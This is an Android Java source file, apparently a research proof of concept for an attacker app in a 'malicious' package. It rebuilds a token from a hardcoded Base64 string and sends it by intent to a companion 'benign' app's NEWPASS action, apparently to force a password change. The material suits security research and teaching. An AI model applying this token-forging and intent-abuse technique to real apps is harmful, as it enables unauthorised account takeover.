package santos.cs.ksu.edu.malicious;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Base64;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import java.math.BigInteger;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onResume(){
        super.onResume();
        final EditText tokenW = (EditText) findViewById(R.id.editText);
        final String t = "DoA/0y0QJIOBsTzLc5S/wg79FMgaKfoVpymt5cUSQ8K3pnjTK2GVnIYMDKTIlT+y";
        tokenW.setText(t);
        final String newToken = recreateToken(t);
        System.out.println("New token = " + newToken);
        /*String hexToken = String.format("%040x",new BigInteger(1,Base64.decode(t,Base64.DEFAULT)));
        System.out.println("Hex token = " + hexToken);*/
        /*String newHexToken = hexToken.substring(hexToken.indexOf("0f"));
        System.out.println("New Hex token = " + newHexToken);
        final String newTokenFromHex = Base64.encodeToString(newHexToken.getBytes(),Base64.DEFAULT);
        System.out.println("New Hex token from hex = " + newTokenFromHex);*/
        final Button button = (Button) findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent("santos.cs.ksu.edu.benign.NEWPASS");
                intent.putExtra("token",newToken);
                startActivity(intent);
            }
        });
    }

    private String recreateToken(String encodedToken){
        byte[] rawToken = Base64.decode(encodedToken,Base64.DEFAULT);
        byte[] newToken = new byte[32];
        int k = 0;
        System.out.println("------ displaying raw token from encoded string");
        for(int i=rawToken.length-32;i<rawToken.length;i++){
            System.out.println(rawToken[i]);
            newToken[k] = rawToken[i];
            k++;
        }
        return Base64.encodeToString(newToken,Base64.DEFAULT);
    }
}
